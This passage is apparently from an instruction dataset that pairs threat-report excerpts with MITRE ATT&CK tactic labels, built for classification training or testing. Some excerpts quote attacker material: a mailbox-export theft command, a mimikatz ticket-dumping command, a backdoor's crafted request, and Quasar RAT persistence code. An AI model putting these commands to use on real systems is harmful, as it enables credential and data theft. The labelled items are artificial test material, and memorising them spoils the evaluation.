address.\nDuring the intrusion we also observed a second hostname appear 'HOME-PC.' This was also found via RDP access related logins.\nBased on the SRUM (System Resource Utility Monitor), with the SOCKS tunnel utilized, the attacker was most active from 0600 UTC to 1100 UTC on the second day of the intrusion.\nDuring the intrusion, it was observed that two different attacker computer names were used, 'DESKTOP-GRALDC5' and 'HOME-PC'.",
        "output": "command and control",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The threat actors moved laterally toward the domain controllers and file shares using Remote Service creation. The pattern \"%COMSPEC% /C \"cmd /c powershell.exe\" is associated with the Cobalt Strike \"psexec_psh\" jump module.\nDecoding the command we can see the same PowerShell download and execute as observed on the beachhead. The hexadecimal value 0x53611451 corresponds to the IP address 83.97.20[.]81 which was the command and control server for the Tor2Mine malware.",
        "output": "lateral movement",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Samples discovered by TAU have been seen to affect versions of macOS from 10.10.5 to 10.14.3 as of December 2019. To this point, all discovered samples of this malware have targeted only macOS. The malware employs multiple levels of obfuscation and is capable of privilege escalation. Many of the initial DMGs are signed with a legitimate Apple developer ID and use legitimate system applications via bash to conduct all installation activities. Although most samples were DMG files, we also discovered .pkg, .iso, and .zip payloads. The following analysis results reflect execution of a DMG-based payload. \nNote: There are many other samples found by TAU that appear to be variations of this malware, masquerading as pirated software  these variations may have different application paths. The paths noted below represent only those of the original variants directly observed and verified by TAU via binary analysis or across our customer base.\u202fThe samples collected and analyzed by TAU that were derived from pirated software have a nearly identical execution chain as the traditional samples described below, with the exception of the command-line arguments to the curl command: curl -f0L versus curl -fsL. This is an important distinction for detection, as the 0 (force http 1.0) argument is not generally used legitimately, whereas usage of  s (silent) and $-S$ (show errors) is more common. \nThe following represents a high-level overview of the process execution and infection chain for a typical Shlayer installation: \nAs referenced in the Delivery section above, many Shlayer infections are distributed as fake Adobe Flash Player updates from a compromised site, often packaged as a DMG file. The downloaded installer is designed to look like a legitimate installation to trick the user into authenticating with their password to continue the second stage infection such as the screenshot below: \nFigure 6: Fake Flash Update Installer \nWhen this DMG is mounted and the installer executed, a .command script is executed from a hidden directory in the mounted volume. This script base64 decodes and AES decrypts a second script containing an additional encoded script that is subsequently executed. A sample .command script is shown in Figure 2 below, along with the two subsequent decoded/decrypted scripts.\u202fAlthough the format and sequence of these scripts vary among samples, the basic overall  execution chain remains the same. ",
        "output": "execution",
        "source": "github_aptNote"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The actor has distributed its dropper embedded in an archive file (\uc678\uad50\ubd80 \uac00\ud310 2021-05-07.zip) as an attachment through described in the previous section. The actor conducted this spearphishing attack on May 7, 2021. \nThe archive file contains a JavaScript file (\uc678\uad50\ubd80 \uac00\ud310 2021- 05-07.pdf.jse) which pretends to be a PDF file that contains two Base64 encoded blobs. The first one is the content of the decoy PDF file in Base64 format and the other one contains the AppleSeed payload also in Base64 format (encoded twice). \nAt first it uses the MSXML Base64 decoding functionality to decode the first layer and then uses certutil.exe to decode the second layer and get the final ApppleSeed payload. The decoy PDF file has been decoded using the MSXML Base64 decoding function. \nAfter decoding the PDF and AppleSeed payload, the content gets written into the ProgramData directory. At the end, the decoy PDF file is opened by calling Wscript.Shell.Run and the AppleSeed payload executed through PowerShell by calling regsvr32.exe. Calling regsvr32.exe to run a DLL registers it as a server that automatically calls the DLL export function that has been named DIlRegisterServer. \nWscript_Shell.Run(Pdf_Name); ",
        "output": "initial access",
        "source": "github_aptNote"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Next, it will establish persistence on the victim by writing to the following registry key: \nKey: HKEY_CURRENT_USERsoftwaremicrosoftwindowscurrentversionrunmailform Value: wscript.exe /b \"<PATH_TO_JS> NPEfpRZ4aqnh1YuGwQd0\" ",
        "output": "persistence",
        "source": "securelist"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: To identify vulnerable hosts in the compromised network, InvisiMole uses the added functionality in the RC2CL backdoor. Its command 222 was previously used for controlling backdoor configuration values-now the attackers use it to send a range of IP addresses to the compromised computer. \nThe backdoor first tests whether these addresses are active by sending them ICMP echo requests, and retrieves their MAC addresses using the SendARP API. \nTo determine whether the host supports the vulnerable SMBv1.0 protocol, the backdoor: \n\u2022\t Opens SMB session on port 445 (and optionally on another port).   \n\u2022\t Sends SMB_COM_NEGOTIATE packet (0x72) to negotiate the SMB protocol (see Figure 11). It only lists \"NT LM 0.12\" as a supported dialect, forcing the server to choose SMBv1.0 protocol for the session, as long it is supported by the server. \n\u2022\t Sends SMB_COM_SESSION_SETUP_ANDX packet (0x73) to setup the SMB session (see Figure 12). The only command in the packet is No further commands (0xFF). The backdoor doesn't send any more commands within the session. \n\u2022\t Logs off the session by sending SMB_COM_LOGOFF_ANDX packet (0x74) with the command No further commands (0xFF), as shown in Figure 13. \nThe results of this scan are reported back to the C&C server. \nAfter identifying vulnerable hosts, we assume the attackers push a tool that tries to exploit the vulnerability via the same backdoor-RC2CL already has mechanisms in place to download and execute additional code. ",
        "output": "other",
        "source": "github_aptNote"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: DEV-0270 uses a handful of defensive evasion techniques to avoid detection. The threat actors typically turn off Microsoft Defender Antivirus real-time protection to prevent Microsoft Defender Antivirus from blocking the execution of their custom binaries. The threat group creates or activates the DefaultAccount account to add it to the Administrators and Remote Desktop Users groups. The modification of the DefaultAccount provides the threat actor group with a legitimate pre-existing account with nonstandard, higher privileges. DEV-0270 also uses powershell.exe to load their custom root certificate to the local certificate database. This custom certificate is spoofed to appear as a legitimate Microsoft-signed certificate. \nHowever, Windows flags the spoofed certificate as invalid due to the unverified certificate signing chain. This certificate allows the group to encrypt their malicious communications to blend in with other legitimate traffic on the network. \nAdditionally, DEV-0270 heavily uses native LOLBins to effectively avoid detection. The threat group commonly uses native WMI, net, CMD, and PowerShell commands and registry configurations to maintain stealth and operational security. They also install and masquerade their custom binaries as legitimate processes to hide their presence. Some of the legitimate processes they masquerade their tools as include: dllhost.exe, task_update.exe, user.exe, and CacheTask. Using .bat files and powershell.exe, DEV-0270 might terminate existing legitimate processes, run their binary with the same process name, and then configure scheduled tasks to ensure the persistence of their custom binaries. ",
        "output": "defense evasion",
        "source": "microsoft"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: In some cases, the threat actor used a malicious file, Persistence.vbs, to persist in targets' environments. When run, Persistence.vbs added a file, typically named a.vbs, to the CurrentVersion\\Run registry key. In other cases, Mint Sandstorm created a scheduled task to reach out to an attacker-controlled supabase[.]co domain and download a .txt file. ",
        "output": "persistence",
        "source": "microsoft"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The Lazarus group is currently one of the most active and prolific APT actors. In 2018, Kaspersky published a report on one of their campaigns, named Operation AppleJeus. Notably, this operation marked the first time Lazarus had targeted macOS users, with the group inventing a fake company in order to deliver their manipulated application and exploit the high level of trust among potential victims. As a result of our ongoing efforts, we identified significant changes to the group's attack methodology. To attack macOS users, the Lazarus group has developed homemade macOS malware, and added an authentication mechanism to deliver the next stage payload very carefully, as well as loading the next-stage payload without touching the disk. In addition, to attack Windows users, they have elaborated a multi-stage infection procedure, and significantly changed the final payload. We assess that the Lazarus group has been more careful in its attacks following the release of Operation AppleJeus and they have employed a number of methods to avoid being detected. \nFor more information, please contact: intelreports@kaspersky.com ",
        "output": "other",
        "source": "securelist"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Once entails.exe (rundll32.exe) successfully executed templates544.png on the beachhead host, an outbound connection was established talking to trentonkaizerfak[.]com.\nThis downloaded a gzip file for the next IcedID stage. After executing this payload, command and control was established to 5.255.103[.]16\nAfter the injection into cmd.exe on the beachhead host, 1.dll (Cobalt Strike DLL) was created, which later was transferred to the domain controller. Then, 1.dll was executed on the domain controller via rundll32.exe and after execution, rundll32.exe connected to the command and control server 5.8.18[.]242. This server was observed in aprior case, which also resulted in Nokoyawa ransomware.",
        "output": "command and control",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Trickbot injected into wermgr.exe processes and used this for communication to command and control infrastructure.",
        "output": "defense evasion",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: IcedIDsetup persistence on the beach head host using a scheduled task.\nThe execution of the ransomware executable created a RunOnce key for persistence.",
        "output": "persistence",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Volt Typhoon actors have been observed leveraging compromised SOHO routers and virtual private servers (VPS) to proxy C2 traffic. For more information, see DOJ press release U.S. Government Disrupts Botnet People's Republic of China Used to Conceal Hacking of Critical Infrastructure). \nThey have also been observed setting up FRP clients [T1090] on a victim's corporate infrastructure to establish covert communications channels [T1573] for command and control. In one instance, Volt Typhoon actors implanted the FRP client with filename SMSvcService.exe on a Shortel Enterprise Contact Center (ECC) server and a second FRP client with filename Brightmetricagent.exe on another server. These clients, when executed via PowerShell [T1059.001], open reverse proxies between the compromised system and Volt Typhoon C2 servers. Brightmetricagent.exe has \nadditional capabilities. The FRP client can locate servers behind a network firewall or obscured through Network Address Translation (NAT) [T1016]. It also contains multiplexer libraries that can bidirectionally stream data over NAT networks and contains a command-line interface (CLI) library that can leverage command shells such as PowerShell, Windows Management Instrumentation (WMI), and Z Shell (zsh) [T1059.004]. See Appendix C and MAR-10448362-1.v1 for more information. \nIn the same compromise, Volt Typhoon actors exploited a Paessler Router Traffic Grapher (PRTG) server as an intermediary for their FRP operations. To facilitate this, they used the netsh command, a legitimate Windows command, to create a PortProxy registry modification [T1112] on the PRTG server [T1090.001]. This key alteration redirected specific port traffic to Volt Typhoon's proxy infrastructure, effectively converting the PRTG's server into a proxy for their C2 traffic [T1584.004] (see Appendix B for details). ",
        "output": "command and control",
        "source": "Mitre"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The investigation identified tools for obtaining credentials. Besides the publicly available mimikatz utility, the attackers used secretsdump and ProcDump. Secretsdump was found on one victim's system at the following paths: \nWhile no traces of the first command's successful execution were found, the results of the second one were located at the following paths: ",
        "output": "credential access",
        "source": "securelist"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The threat actors were seen using overpass the hash to elevate privileges in the Active Directory environment via Mimikatz style pass the hash logon events, followed by subsequent suspect Kerberos ticket requests matching network alert signatures.\nUsing these credentials, the threat actors attempted to use aCobalt Strike beaconinjected into the LSASS process to execute WMIC, which executed ProcDump on a remote system to dump credentials.\nThis activity appears to have failed due to Windows Defender activity.",
        "output": "credential access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Several files collected during discovery tasks, such as domain user account information and later the keylogger collected data, were exfiltrated to the C2 server via POST requests.",
        "output": "exfiltration",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The following discovery commands where observed coming from the Qbot processes. These commands where executed on the beachhead system along with other workstations compromised through lateral movement.",
        "output": "discovery",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Timeframe: Approximately 14 months before encryption and wiper attacks. \nDetails: Initial access was obtained via exploitation of an Internet-facing Microsoft SharePoint, exploiting CVE-2019- 0604. ",
        "output": "initial access",
        "source": "github_aptNote"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: In this blog post, we explored how modern AI tools can help create more convincing vishing attacks. The alarming success of Mandiant's vishing underscores the urgent need for heightened security measures against AI voice-spoofing attacks. While technology offers powerful tools for both attackers and defenders, the human element remains the critical vulnerability. The case study we shared should serve as a wake-up call, urging organizations and individuals alike to take proactive steps. \nMandiant started leveraging AI voice-spoofing attacks in its more complex Red Team Assessments and Social Engineering Assessments to demonstrate increases in frequency, it is imperative that defenders plan and take precautions. \nPosted in Threat Intelligence ",
        "output": "other",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The attacker invoked the IIS backdoor by sending a crafted POST request with a cookie EX_TOKEN. The module extracts the cookie value and initiates a mailbox export request with the supplied filter. \nUser-Agent: Mozi1la/5.0 (Macintosh; Intel Mac 0S X 10_15_7) AppleWebKit/537.36 (KHTML, 1ike Gecko)   \nChrome/91.0.4472.114 Safari/537.36   \nConnection:Keep-Alive   \nCookie:EX_TOKEN=QfFa4bV99qT0vt/y/ruYgcx1663VYdc21i9gYVeNTg7s1vvouFNw/10affVKQpImSbAswoPprjF0DL1GdppfdA= \nFigure 10. Attacker-generated POST request \nThe value decodes to:   \nep,06/21/2022,06/21/2022,C:\\Windows\\Web,Administrator, where ep is the command to initiate the mailbox export request with filters determining the start and end dates followed by the export path. The final command has the following syntax: \nNew-MailboxExportRequest -Mailbox \"Administrator\" -FilePath\"\\\\server\\C\\$\\Windows\\Web\\Administrator_51.152.pst\" -BatchName \"fa21edde-6597-4d5c-8277-53cb98b9df94\"-ContentFi1ter \nFigure 11. Attacker-generated mailbox export request $=$ $=$ \nThe table below details all the commands found in the backdoor: ",
        "output": "exfiltration",
        "source": "microsoft"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Starting around 4.5 hours after the initial Bazar malware was executed, the Ryuk threat actors acted on their final objectives and initiated RDP connections from the domain controller previously exploited, to the rest of the environment. This time they initiated the ransomware first on the secondary domain controller (their 1st pivot) and transferred the Ryuk executable over the RDP connection.\nEnjoy our report? Please consider donating $1 or more to the project usingPatreon. Thank you for your support!\nWe also have pcaps, files, memory images, Kape and Redline packages availablehere.",
        "output": "impact",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: QBot initially starts a number of processes to collect information about the affected system. This is part of the \"SYSTEM INFO\" bot request, as described in a recent article fromSecureList.\nLater, more discovery commands were executed via the Cobalt Strike beacon, which gathered information about the active directory environment.\nADFind(renamed in find.exe) used to enumerate computers\nOn the Domain Controller, the threat actors gathered information about the installed security software through WMI:\nPing was used to verify machines were online",
        "output": "discovery",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Named pipe impersonation\nThe named pipe impersonation technique was used multiple times on different hosts in order to get system privileges. This is a common technique used by threat actors, and implemented by the GetSystemCobalt Strike command. As seen in the screenshot below, GetSystem creates a service and connects to a pipe.\nThe beacon creates the named pipe (seen in Sysmon EventID 17) and impersonates theNT AUTHORITY\\SYSTEMaccount used to connect to the pipe.\nThe MITRE Cyber Analytics Repository (CAR) details the Get System elevation,CAR-2021-02-002: Get System Elevation\nWinlogon Token Impersonation/Theft\nMultiple access to WinLogon with granted access 0x40 (PROCESS_DUP_HANDLE) were performed. Such access can be tracked with Sysmon event ID 10 (ProcessAccess). As explained inthis blog written by Jonathan JOHNSON, opening a handle to WinLogon in order to duplicate the token and call ImpersonateLoggedOnUser is a known Cobalt Strike technique.\nZeroLogon\nOn the second day of the intrusion, a spike in NetLogon traffic was observed from the beachhead host to a domain controller. This traffic then triggered several network signatures for CVE-2020-1472 otherwise known as ZeroLogon.\nThe event logs corroborated a successful exploitation with a password update Event 4742 for one of the Domain Controller passwords.",
        "output": "privilege escalation",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The threat actor heavily used the reverse SSH tunnel discussed within the Command and Control section to assist in lateral movement. Through this tunnel, the threat actor was able to proxy their access from the beachhead to other assets in the network using a handful of different techniques, including WMI, and RDP.\nAs mentioned in the discovery section, Impacket's atexec module was utilized within the SSH tunnel to proxy traffic to a domain controller to assist with lateral movement. In between executions of atexec, we see Windows Security event logs that match behavior of lateral movement:\nSMB\nDuring the intrusion, the threat actor used SMB to copy files over to other systems. Here, the files were not sent over the network in the clear, preventing network inspection, but we were able to inspect the file creation and deletion via event ID 5145 for File Share Auditing event. In the logs, we can see the AccessMask of 0x2 during the file write followed by 0x10080 during the file delete action.\nWMI\nImpacket's wmiexec tool was used to pivot across the environment, extract the archived filecache.cab, and execute scheduled tasks to run NetSupport RAT on remote systems.\nFor a breakdown of the process command line arguments, refer to this previousreport.\nRDP\nRemote Desktop Protocol (RDP) was used from the beachhead to two servers and two domain controllers on the network. We can verify this activity with Windows Event ID 4624 with logon type 10. This log triggers whenever a user successfully logs on to a computer or server via remote interactive logon (RDP or other remote desktop services).\nBelow illustrates the threat actor initiating RDP sessions from the beachhead to various servers within the network on day eight of this intrusion.\nBelow, illustrates the full network architecture and lateral movement seen within this incident.\nDuring the intrusion, the threat actor revealed two different host names leaked in various Windows Event logs during their RDP sessions.\nExample Windows event ID 4776:\nExample Windows event ID 4624:\nExample Windows event ID 4779:",
        "output": "lateral movement",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Mimikatzwas used to dump credentials from memory, as well as, export Kerberos tickets using the following command:\nThe threat actors used a vbs script named launch to execute mimikatz. This is the content of launch.vbs\nSince the log parameter was used, the output was saved to mimikatz.log\nThe Kerberos tickets were saved to disk, due to the threat actor using sekurlsa::tickets /export.",
        "output": "credential access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Ewind is more than simply Adware. Ewind is, at very least, an actual Trojan \u2013 subverting genuine Android apps. The functionality to forward SMS messages to a C2 hints at possible intentions beyond just delivering adware. Of real concern is that although we've only observed these Trojans being used to deliver advertising to victims, as our analysis shows, with device-admin access and the functionality to download and execute any file on the device, the actor behind this activity can easily take full control of the victim device.\nWhile identifying a Malware author as Russian is not at all surprising, usually Russian actors avoid targeting Russian subjects. Deliberate targeting of Russians, in this case \u2013 by an apparently Russian actor \u2013 is therefore somewhat unusual.\nWe have here an actor not only developing malware for monetization, but responsible for a network of Android App Store infrastructure which has over the years been used to serve tens of thousands of Android downloads in support of his advertising-supported monetization schemes.\nPalo Alto Networks customers are protected from the Ewind Trojan:\nWildFire properly classifies Ewind samples as malicious. \nC2 servers associated with this activity are blocked through Threat Prevention DNS signatures. \nDownload sites associated with this actor are categorized as Malware. \nAutoFocus customers can monitor this activity using the \"Ewind\" tag.",
        "output": "other",
        "source": "Palo"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Volt Typhoon actors have been observed leveraging compromised SOHO routers and virtual private servers (VPS) to proxy C2 traffic. For more information, see DOJ press release U.S. Government Disrupts Botnet People's Republic of China Used to Conceal Hacking of Critical Infrastructure). \nThey have also been observed setting up FRP clients [T1090] on a victim's corporate infrastructure to establish covert communications channels [T1573] for command and control. In one instance, Volt Typhoon actors implanted the FRP client with filename SMSvcService.exe on a Shortel Enterprise Contact Center (ECC) server and a second FRP client with filename Brightmetricagent.exe on another server. These clients, when executed via PowerShell [T1059.001], open reverse proxies between the compromised system and Volt Typhoon C2 servers. Brightmetricagent.exe has \nadditional capabilities. The FRP client can locate servers behind a network firewall or obscured through Network Address Translation (NAT) [T1016]. It also contains multiplexer libraries that can bidirectionally stream data over NAT networks and contains a command-line interface (CLI) library that can leverage command shells such as PowerShell, Windows Management Instrumentation (WMI), and Z Shell (zsh) [T1059.004]. See Appendix C and MAR-10448362-1.v1 for more information. \nIn the same compromise, Volt Typhoon actors exploited a Paessler Router Traffic Grapher (PRTG) server as an intermediary for their FRP operations. To facilitate this, they used the netsh command, a legitimate Windows command, to create a PortProxy registry modification [T1112] on the PRTG server [T1090.001]. This key alteration redirected specific port traffic to Volt Typhoon's proxy infrastructure, effectively converting the PRTG's server into a proxy for their C2 traffic [T1584.004] (see Appendix B for details). ",
        "output": "command and control",
        "source": "github_aptNote"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The attacker initiates the attack by sending a phishing email stating that a shipment has been delivered. It also includes an attached invoice. The attachment is an SVG file named \"INV0ICE_#TBSBVS0Y3BDSMMX.svg,\" which contains embedded base64-encoded data.\nAfter victims open the SVG file, the ECMAScript creates a new blob and utilizes \"window.URL.createObjectURL\" to drop the decoded data as a ZIP file named \"INV0ICE_#TBSBVS0Y3BDSMMX.zip.\"\nThe decompressed file is an obfuscated batch file that embeds its payload in the section \"------BEGIN X509 CRL-----.\" Based on the decoded comment in the first line, it is presumed that this batch file was created by the BatCloak tool, known for using heavily obfuscated batch files to deploy various malware families. BatCloak has been employed since 2022 to distribute malware while effectively evading detection by antivirus programs.\nThe script initially copies a PowerShell execution file to \"C:\\Users\\Public\\xkn.exe\" and utilizes the copied file in later commands. It includes parameters in each command, \"-WindowStyle hidden -inputformat none -outputformat none -NonInteractive,\" to conceal its activity from the victim's notice. It then decodes the malicious data and saves it as \"pointer.png.\" After hex-decoding, the result is saved as a \"pointer\" and moved to \"C:\\Users\\Public\\Libraries\\pointer.cmd.\" Upon executing \"pointer.cmd,\" it employs \"cmd /c del\" to delete all the files mentioned above.",
        "output": "initial access",
        "source": "Fortinet"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The initial access occurred via a brute-force attack, where the threat actors mainly targeted the System Admin (\"sa\") account.\nDuring the intrusion, we observed over 10,000 failed attempts before successful login.\nSQL Server event ID 18456 Failure Audit Events in the Windows application logs:\nSuccessful Login:",
        "output": "initial access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Quasar achieves persistence by executing on startup, as seen in the source code shown in figure 4. To achieve persistence, Quasar uses two methods: scheduled tasks and registry keys. If the client process has administrator privileges, the client will generate a scheduled task via schtasks . The scheduled task is generated using the task name created in the client builder. The schedule task runs after the host user logs on, executes with the highest run level (i.e., the highest level of privilege), and suppresses any errors related to creating the task. If the process does not have administrator privileges, the scheduled task will only add a registry value. That registry value is added to the following key: \nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run. \nThe value name is then configured in the client builder, and the client adds its current path as the startup program. \nif (WindowsAccountHelper.GetAccountType() $==$ \"Admin\") { try { ProcessStartInfo startInfo $=$ new ProcessStartInfo(\"schtasks\") \nArguments $=$ \"/create /tn \\\"\" $^+$ Settings.STARTUPKEY $^+$ \"\\\" /sc ONLOGON /tr \\\"\" $^+$ ClientData.CurrentPath $^+$ \"\\\" /rl HIGHEST /f\", \nUseShellExecute $=$ false, CreateNoWindow $=$ true }; \nProcess $\\uprho=$ Process.Start(startInfo) p.WaitForExit(1000); if (p.ExitCode $\\mathtt{=}\\mathtt{=}0$ ) return true; } catch (Exception) { } \nreturn   \nRegistryKeyHelper.AddRegistryKeyValue(RegistryHive.CurrentUser, \"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\",   \nSettings.STARTUPKEY, ClientData.CurrentPath, true); } else { return   \nRegistryKeyHelper.AddRegistryKeyValue(RegistryHive.CurrentUser, \"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\",   \nSettings.STARTUPKEY, ClientData.CurrentPath, true); ",
        "output": "persistence",
        "source": "Mitre"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The LSASS process was accessed by an unusual process \"wuauclt.exe\" on the beachhead host. This was the Cobalt Strike Beacon and was used to access the credentials.\nThis is not the first time we have observed this process (wuauclt.exe) being used. In our previous report with another IcedID infection leading toSodinokibi ransomwarewe also observed the same process being used.\nThe same process was also observed invoking PowerShell scripts:\n\"Wuauclt.exe\" is normally used for the Microsoft Windows Update Service and this was an attempt to blend into the OS environment.",
        "output": "credential access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: On the third day, the threat actors began their final actions. The final actions took place from a compromised file server. They began with a ping sweep to locate all live hosts. After that completed, they reviewed the results on the host.\nFrom a file server, the threat actors then established RDP connections to all the machines in the environment.  The threat actors transferred 2 files onto the machines they connected to. A batch script named kill.bat and a ransomware executable CryptoLocker64.exe.\nThe batch script is responsible for deletion of volume shadow copies, turning off automatic repairs and stopping all the running services on the host. Some of the commands are as follows:\nAfter completion of this activity, the ransomware binary was executed manually over the RDP connections.\nFrom the threat actors starting their ping sweep, to final host encryption, about an hour passed leaving behind the ransom note for the organization to find. The threat actors went from initial access to domain wide ransomware in just under two days.",
        "output": "impact",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: During the intrusion, the threat actors targeted password documents on network shares. We observed these being taken and opened off network through the use of canaries. No overt exfiltration was observed so we assess that this occurred over existing command and control channels.\nThe threat actors opened the document from the IP:",
        "output": "exfiltration",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: IcedID:\nThroughout the intrusion the threat actor used a mix of Port 80 and 443 for C2. Port 80 was observed in the communication to testsubnet[.]com which contains a HTTP Cookie in the format: wordpress_<Base64EncodedString>. This activity was observed at a rate of every 2-4 seconds.\nallnezokila[.]cyou2tothepollo[.]topdaserekolut[.]top194.5.249[.]81dsedertyhuiokle[.]top5.149.252[.]179\nJA3:a0e9f5d64349fb13191bc781f81f42e1\nJA3s:ec74a5c51106f0419184d0dd08fb05bc\nCertificate:[9b:84:ff:5d:0a:27:25:f6:a3:b3:b8:83:bd:36:50:88:4b:c7:20:06]\nNot Before:2021/04/28 15:18:08\nNot After:2022/04/28 15:18:08\nIssuer Org:Internet Widgits Pty Ltd\nSubject Common:localhost\nSubject Org:Internet Widgits Pty Ltd\nPublic Algorithm:rsaEncryption\nCobalt Strike:\ntestsubnet.com\n82.117.252.32\nJA3:a0e9f5d64349fb13191bc781f81f42e1\nJa3s:ae4edc6faf64d08308082ad26be60767\nCertificate:[92:da:38:08:d9:a0:67:2f:e5:67:2e:f0:40:d6:06:21:89:2c:54:cc]\nNot Before:2021/04/22 07:13:54\nNot After:2021/07/21 07:13:54\nIssuer Org:Let's Encrypt\nSubject Common:testsubnet.com[ns1.testsubnet.com,ns2.testsubnet.com,ns3.testsubnet.com,ns4.testsubnet.com,testsubnet.com]\nPublic AlgorithmrsaEncryption\nCobalt Strike Beacon Config\nExfiltration\nNo exfiltration was observed; however, we were able to determine that access to the File server was achieved, with multiple access attempts and successes.\nImpact\nNo impact was observed nor any follow-on activities to deny, disrupt or destroy data or systems.",
        "output": "command and control",
        "source": "DFIR"
    },
    {
